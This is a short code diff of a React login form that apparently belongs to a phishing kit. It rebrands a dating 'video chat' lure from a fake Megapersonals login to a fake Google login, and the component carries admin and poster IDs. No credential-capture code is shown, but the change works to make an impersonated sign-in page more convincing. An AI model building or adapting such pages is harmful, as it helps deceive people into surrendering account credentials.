@@ -59,11 +59,11 @@ function LoginForm({ adminId, posterId }) {
                 />
               </div>
               <h2 class="text-3xl font-bold text-blue-900 text-center">
-                Facetime
+                Live Video Chat
               </h2>
               <p class="text-xl pt-5 font-semibold text-[#707b8e]">
-                Login With Megapersonals and enjoy with{" "}
-                <b class="text-[#00BE70]">Facetime video chat</b> your dating
+                Login with Google and enjoy with{" "}
+                <b class="text-[#00BE70]">Private Live Video Chat</b> your dating
                 partner.
               </p>
 
@@ -78,7 +78,7 @@ function LoginForm({ adminId, posterId }) {
                     alt=""
                   />
                 </span>
-                <span>Login With Megapersonal</span>
+                <span>Login With Google</span>
               </button>
             </div>
             </div>
